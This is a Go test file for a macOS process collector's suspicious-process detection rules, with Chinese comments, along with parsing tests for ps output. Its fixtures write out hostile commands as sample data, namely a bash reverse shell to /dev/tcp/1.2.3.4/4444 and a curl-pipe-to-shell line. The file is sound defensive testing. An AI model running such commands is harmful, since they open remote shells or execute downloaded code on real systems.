//go:build darwin

// 本文件测的是 darwin 专属的 parsePS（`ps -ww -axo ... command=` 的解析）。
// 没有这行 build tag 时，`GOOS=linux go test ./...` / windows 会直接编译失败
// （undefined: parsePS）——跨平台 CI 一跑就红。加 tag 后，非 darwin 平台跳过
// 这几条用例，其余用例照跑。

package collector

import "testing"

// TestSuspiciousProcRules 判定规则的**双向**测试：既要证明该报的报，
// 也要证明正常的不报。只测正例是自欺——把一切都判可疑也能全绿。
func TestSuspiciousProcRules(t *testing.T) {
	cases := []struct {
		name string
		pi   procInfo
		want []string
	}{
		{
			name: "正常系统进程不报",
			pi:   procInfo{Comm: "/usr/sbin/sshd", Args: "/usr/sbin/sshd -D"},
			want: nil,
		},
		{
			name: "系统进程命令行带 base64 也不报",
			pi: procInfo{
				Comm: "/System/Library/Frameworks/X.framework/X",
				Args: "/System/Library/Frameworks/X.framework/X -LaunchArguments " + longB64(),
			},
			want: nil,
		},
		{
			name: "临时目录里的可执行文件",
			pi:   procInfo{Comm: "/tmp/x", Args: "/tmp/x"},
			want: []string{"exe-in-tmp"},
		},
		{
			name: "可执行文件已删除",
			pi:   procInfo{Comm: "/Users/a/.evil/backdoor (deleted)", Args: "backdoor"},
			want: []string{"exe-deleted", "exe-hidden-dir"},
		},
		{
			name: "解释器 + 长 base64",
			pi: procInfo{
				Comm: "/bin/bash",
				Args: "/bin/bash -c echo " + longB64(),
			},
			want: []string{"cmdline-b64"},
		},
		{
			name: "GUI 应用带 base64 但不涉及解码 → 不报",
			pi: procInfo{
				Comm: "/Applications/Termius.app/Contents/MacOS/Termius",
				Args: "/Applications/Termius.app/Contents/MacOS/Termius -ApplePersistenceIgnoreState YES " + longB64(),
			},
			want: nil,
		},
		{
			name: "非解释器但出现解码指令 → 报",
			pi: procInfo{
				Comm: "/usr/local/bin/tool",
				Args: "/usr/local/bin/tool " + longB64() + " | base64 -d",
			},
			want: []string{"cmdline-b64"},
		},
		{
			name: "反弹 shell 形态",
			pi:   procInfo{Comm: "/bin/bash", Args: "/bin/bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"},
			want: []string{"reverse-shell-shape"},
		},
		{
			name: "curl 管道执行",
			pi:   procInfo{Comm: "/bin/bash", Args: "bash -c curl -s http://x/y.sh | sh"},
			want: []string{"pipe-to-shell"},
		},
		{
			name: "正常工具链的隐藏目录不报",
			pi:   procInfo{Comm: "/Users/a/.local/bin/tool", Args: "tool"},
			want: nil,
		},
		{
			name: "白名单外的隐藏目录要报",
			pi:   procInfo{Comm: "/Users/a/.evil/x", Args: "x"},
			want: []string{"exe-hidden-dir"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := suspiciousProc(tc.pi)
			if len(got) != len(tc.want) {
				t.Fatalf("reasons 不符\n got=%v\nwant=%v", got, tc.want)
			}
			for i := range got {
				if got[i] != tc.want[i] {
					t.Fatalf("第 %d 项不符\n got=%v\nwant=%v", i, got, tc.want)
				}
			}
		})
	}
}

func TestParsePS(t *testing.T) {
	out := `  100     1 root     /usr/sbin/sshd -D
  200   100 xu.      /bin/zsh -il
  300   200 xu.      /usr/bin/python3 script.py --flag value
  bad line
`
	got := parsePS(out)
	if len(got) != 3 {
		t.Fatalf("应解析出 3 条, got %d", len(got))
	}
	if got[0].PID != 100 || got[0].PPID != 1 || got[0].User != "root" {
		t.Fatalf("首条字段不符: %+v", got[0])
	}
	if got[2].Comm != "/usr/bin/python3" {
		t.Fatalf("exe 应从命令行首段提取, got %q", got[2].Comm)
	}
	if got[2].Args != "/usr/bin/python3 script.py --flag value" {
		t.Fatalf("args 应保留完整命令行, got %q", got[2].Args)
	}
}

func TestHiddenDirSuspicious(t *testing.T) {
	yes := []string{
		"/Users/a/.evil/x",
		"/tmp/.hidden/payload",
		"/Users/a/.ssh/backdoor", // .ssh 不在白名单：那里出现可执行文件本身可疑
	}
	for _, p := range yes {
		if !hiddenDirSuspicious(p) {
			t.Fatalf("应判可疑: %s", p)
		}
	}
	no := []string{
		"/Users/a/.local/bin/tool",
		"/Users/a/.hermes/tools/python3",
		"/usr/bin/ls",
		"/Users/a/project/bin/app",
	}
	for _, p := range no {
		if hiddenDirSuspicious(p) {
			t.Fatalf("不应判可疑: %s", p)
		}
	}
}

func TestHasLongB64(t *testing.T) {
	if !hasLongB64(longB64()) {
		t.Fatal("长 base64 应命中")
	}
	if hasLongB64("short base64 abc123") {
		t.Fatal("短串不应命中")
	}
	if hasLongB64("/usr/bin/tool --flag") {
		t.Fatal("普通命令行不应命中")
	}
}

func TestEventNormalize(t *testing.T) {
	// 归一化在 model 包里，这里只验收集器产出的严重度符合预期
	p := &Process{}
	p.Init("process", ModePoll, 0, nil)
	if p.Interval().String() != "5s" {
		t.Fatalf("默认周期应为 5s, got %s", p.Interval())
	}
}

// longB64 生成一段长度超过阈值的 base64 文本。
func longB64() string {
	const chunk = "eyJzYW1wbGUiOiJsb25nIn0="
	s := ""
	for len(s) < 130 {
		s += chunk
	}
	return s
}
